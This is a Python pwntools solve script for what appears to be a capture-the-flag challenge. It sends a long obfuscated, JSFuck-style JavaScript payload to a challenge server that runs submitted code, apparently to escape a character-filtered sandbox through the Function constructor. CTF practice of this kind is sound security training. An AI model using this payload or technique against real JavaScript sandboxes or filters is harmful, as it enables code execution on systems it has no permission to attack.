from pwn import *

command = """
[][((![]+[])[((+![]+[])[+![]])])+(([][[]]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+((![]+[])[(((+!![])+(+!![])+[])[+![]])])+((!![]+[])[((+![]+[])[+![]])])+((+!+[]+(!+[]+[])[!+[]+!+[]+!+[]])[+!![]])+((!![]+[])[((+!![]+[])[+![]])])][(([][((![]+[])[((+![]+[])[+![]])])+(([][[]]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+((![]+[])[(((+!![])+(+!![])+[])[+![]])])+((!![]+[])[((+![]+[])[+![]])])+((+!+[]+(!+[]+[])[!+[]+!+[]+!+[]])[+!![]])+((!![]+[])[((+!![]+[])[+![]])])]+[])[(((+!![])+(+!![])+(+!![])+[])[+![]])])+(([][((![]+[])[((+![]+[])[+![]])])+(([][[]]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+((![]+[])[(((+!![])+(+!![])+[])[+![]])])+((!![]+[])[((+![]+[])[+![]])])+((+!+[]+(!+[]+[])[!+[]+!+[]+!+[]])[+!![]])+((!![]+[])[((+!![]+[])[+![]])])]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+(([][[]]+[])[((+!![]+[])[+![]])])+((![]+[])[(((+!![])+(+!![])+(+!![])+[])[+![]])])+((!![]+[])[((+![]+[])[+![]])])+((!![]+[])[((+!![]+[])[+![]])])+((!![]+[])[(((+!![])+(+!![])+[])[+![]])])+(([][((![]+[])[((+![]+[])[+![]])])+(([][[]]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+((![]+[])[(((+!![])+(+!![])+[])[+![]])])+((!![]+[])[((+![]+[])[+![]])])+((+!+[]+(!+[]+[])[!+[]+!+[]+!+[]])[+!![]])+((!![]+[])[((+!![]+[])[+![]])])]+[])[(((+!![])+(+!![])+(+!![])+[])[+![]])])+((!![]+[])[((+![]+[])[+![]])])+(([][((![]+[])[((+![]+[])[+![]])])+(([][[]]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+((![]+[])[(((+!![])+(+!![])+[])[+![]])])+((!![]+[])[((+![]+[])[+![]])])+((+!+[]+(!+[]+[])[!+[]+!+[]+!+[]])[+!![]])+((!![]+[])[((+!![]+[])[+![]])])]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+((!![]+[])[((+!![]+[])[+![]])])](((!![]+[])[((+!![]+[])[+![]])])+((+!+[]+(!+[]+[])[!+[]+!+[]+!+[]])[+!![]])+((!![]+[])[((+![]+[])[+![]])])+((!![]+[])[(((+!![])+(+!![])+[])[+![]])])+((!![]+[])[((+!![]+[])[+![]])])+(([][[]]+[])[((+!![]+[])[+![]])])+(([][((![]+[])[((+![]+[])[+![]])])+(([][[]]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+((![]+[])[(((+!![])+(+!![])+[])[+![]])])+((!![]+[])[((+![]+[])[+![]])])+((+!+[]+(!+[]+[])[!+[]+!+[]+!+[]])[+!![]])+((!![]+[])[((+!![]+[])[+![]])])]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+(([][((![]+[])[((+![]+[])[+![]])])+(([][[]]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+((![]+[])[(((+!![])+(+!![])+[])[+![]])])+((!![]+[])[((+![]+[])[+![]])])+((+!+[]+(!+[]+[])[!+[]+!+[]+!+[]])[+!![]])+((!![]+[])[((+!![]+[])[+![]])])]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+((![]+[])[(((+!![])+(+!![])+(+!![])+[])[+![]])]))()[(([][((![]+[])[((+![]+[])[+![]])])+(([][[]]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+((![]+[])[(((+!![])+(+!![])+[])[+![]])])+((!![]+[])[((+![]+[])[+![]])])+((+!+[]+(!+[]+[])[!+[]+!+[]+!+[]])[+!![]])+((!![]+[])[((+!![]+[])[+![]])])]+[])[(((+!![])+(+!![])+[])[+![]])+(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+((+!+[]+(!+[]+[])[!+[]+!+[]+!+[]])[+!![]])+((!![]+[])[((+!![]+[])[+![]])])+((![]+[])[(((+!![])+(+!![])+(+!![])+[])[+![]])])+(([][[]]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+(([][((![]+[])[((+![]+[])[+![]])])+(([][[]]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+((![]+[])[(((+!![])+(+!![])+[])[+![]])])+((!![]+[])[((+![]+[])[+![]])])+((+!+[]+(!+[]+[])[!+[]+!+[]+!+[]])[+!![]])+((!![]+[])[((+!![]+[])[+![]])])]+[])[(((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]])])+(([][[]]+[])[((+!![]+[])[+![]])])]+[]
"""

io = remote("chall.lac.tf", "31130")
# io = process(["node", "index.js"])
io.sendlineafter(b"Gimme some js code to run", command.strip().encode())

io.interactive()